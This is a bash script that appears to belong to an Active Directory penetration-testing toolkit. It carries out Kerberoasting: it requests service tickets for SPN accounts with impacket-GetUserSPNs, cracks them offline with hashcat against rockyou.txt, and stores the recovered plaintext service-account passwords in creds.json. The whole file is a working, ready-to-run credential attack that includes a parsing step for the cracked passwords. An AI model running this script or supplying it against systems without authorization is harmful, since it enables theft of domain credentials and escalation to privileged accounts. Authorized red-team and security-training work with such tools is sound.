#!/usr/bin/env bash
# =============================================================================
#  kerberoast.sh  —  request Kerberoastable SPN tickets + optional crack  (ATOMIC)
# =============================================================================
#  Attack-chain role: any valid domain credential can request service tickets
#  for accounts with an SPN; those tickets are offline-crackable to recover the
#  service account's plaintext. Classic path to a privileged service account.
#
#  Flow: GetUserSPNs -request → hashcat-format hashes → (optional) hashcat
#  crack → any cracked password is appended to creds.json.
#
#  Extra flags:
#    -w, --wordlist <file>   hashcat wordlist (default rockyou.txt)
#    --crack                 crack automatically without prompting
#    --no-crack              never prompt/crack (just save hashes)
# =============================================================================
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" >/dev/null 2>&1 && pwd)"
SCRIPT_ARGS="$*"
source "$SCRIPT_DIR/lib/common.sh"

usage() { cat <<'EOF'
kerberoast.sh — request Kerberoastable SPN tickets + optional crack (ATOMIC)

USAGE:   ./kerberoast.sh [-t dc] [-d domain] [-w wordlist] [--crack|--no-crack] [-q]
EXAMPLE: ./kerberoast.sh --crack

FLAGS:
  -w, --wordlist <file>  hashcat wordlist (default /usr/share/wordlists/rockyou.txt)
      --crack            crack immediately, no prompt
      --no-crack         only save hashes; never prompt/crack
  -h, --help             this help
  (shared flags -t/-d/-q: --help-common)

WHAT IT DOES: impacket-GetUserSPNs -request -> hashcat -m 13100; any cracked
  password is appended to creds.json.
PREREQS: any valid domain credential in creds.json; DC reachable.
EOF
}

WORDLIST="/usr/share/wordlists/rockyou.txt"
CRACK_MODE="ask"           # ask | always | never

parse_common_args "$@"
set -- "${COMMON_REMAINING[@]}"
while [[ $# -gt 0 ]]; do
  case "$1" in
    -w|--wordlist) WORDLIST="$2"; shift 2 ;;
    --crack)    CRACK_MODE="always"; shift ;;
    --no-crack) CRACK_MODE="never";  shift ;;
    -h|--help) usage; exit 0 ;;
    *) log_warn "ignoring unknown arg: $1"; shift ;;
  esac
done

[[ -n "$TARGET" ]] || die "no target: set scope.txt or pass -t <dc>"
require_creds "$DOMAIN_OVERRIDE"
DOMAIN="$(resolve_domain)"

log_begin
announce_loot
HASHES="$(loot_dir)/kerberoast.hashes"

# 1) Request TGS tickets for all SPN accounts the credential can see.
need_cmd impacket-GetUserSPNs
run_cmd "impacket-GetUserSPNs -request -dc-ip ${DC} -outputfile '${HASHES}' $(imp_target) $(imp_secret_flags)"

if [[ ! -s "$HASHES" ]]; then
  log_warn "no Kerberoastable hashes written — likely no SPN accounts or auth failed"
  log_end "partial"; exit 0
fi
log_ok "saved $(grep -c '^\$krb5tgs' "$HASHES" 2>/dev/null || echo '?') hash(es) to ${HASHES}"

# 2) Optionally crack with hashcat (mode 13100 = Kerberoast TGS-REP).
do_crack=1
case "$CRACK_MODE" in
  never)  do_crack=0 ;;
  always) do_crack=1 ;;
  ask)    confirm "Crack the Kerberoast hashes now with hashcat?" && do_crack=1 || do_crack=0 ;;
esac

if [[ "$do_crack" -eq 1 ]]; then
  need_cmd hashcat
  [[ -f "$WORDLIST" ]] || log_warn "wordlist not found: ${WORDLIST}"
  run_cmd "hashcat -m 13100 '${HASHES}' '${WORDLIST}' --quiet" || log_warn "hashcat returned non-zero (may be exhausted/already-cracked)"

  # Pull cracked results. Use the sensitive ordering: capture → track+store the
  # new plaintext → THEN log, so the recovered password is redacted even here.
  SHOW_CMD="hashcat -m 13100 '${HASHES}' --show"
  log_run "$SHOW_CMD"
  exec_capture "$SHOW_CMD"
  found=0
  while IFS= read -r line; do
    [[ "$line" == *'$krb5tgs$'* ]] || continue
    # sAMAccountName is the field after "*" in: $krb5tgs$23$*user$REALM$spn*...
    # Parse with bash expansion (locale-safe; avoids grep -P \K, which errors
    # under a non-UTF-8/C locale): take everything after the first "$*", then up
    # to the next "$".
    acct="${line#*\$\*}"; acct="${acct%%\$*}"
    plain="${line##*:}"                 # everything after the final ':' is the password
    [[ -z "$plain" || "$plain" == "$line" ]] && continue
    acct="${acct:-unknown}"
    creds_add "$DOMAIN" "$acct" "password" "$plain" "Kerberoast, $(date '+%F')"
    found=$((found+1))
  done <<< "$LAST_OUTPUT"
  log_output                            # redacted (cracked passwords now tracked)
  [[ "$found" -gt 0 ]] && log_ok "recovered ${found} Kerberoast password(s) into creds.json" \
                        || log_warn "no plaintext recovered (wordlist exhausted?)"
fi

log_end "success"
